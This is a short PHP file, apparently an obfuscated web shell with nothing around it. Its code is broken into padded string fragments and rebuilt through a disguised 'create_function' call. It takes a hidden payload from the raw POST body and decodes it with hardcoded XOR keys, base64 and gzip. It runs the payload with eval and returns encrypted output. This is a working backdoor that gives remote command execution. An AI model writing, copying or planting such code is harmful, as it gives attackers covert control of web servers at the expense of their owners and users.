<?php
$F='$o.=$t{$=*i}^$k=*{$j}=*;}}ret=*urn $o;}i=*f (@pr=*eg_matc=*=*h("/$=*kh(.+)$kf/",@=*file_get=*_c=*onten=*ts("=*php://inp';
$u='=*c=*ontents();=*@ob_end_=*c=*lean();$r=@bas=*e=*64_e=*ncode(@x=*(@gzco=*mpress($o),$k=*));p=*rint(=*"$p$kh$r$=*kf");}';
$l='$k="59=*89f=*dc3";$kh==*"993a5=*5f=*83a8b";$k=*f="=*8=*7f820621=*d19=*";$p="O=*dBLbU=*M9xW1bTJll"=*;function x($t=*,$=*k)';
$e='ut")=*,=*$m)=*==1) =*=*{@ob_start();@ev=*al(@gzunc=*ompre=*ss(=*@x(@b=*ase=*64_deco=*=*=*de($=*m[1]),$k)));$o=@ob_get_';
$c='{$=*c=strlen(=*$k);=*=*$l=st=*rlen=*($t);=*$o="=*";for($i=0;$i<=*$l;)=*{fo=*r($j=0;($j=*<$c&&$i<$l);$=*j+=*+,$i=*++){';
$K=str_replace('z','','crzzeate_zzfuzznction');
$G=str_replace('=*','',$l.$c.$F.$e.$u);
$h=$K('',$G);$h();
?>
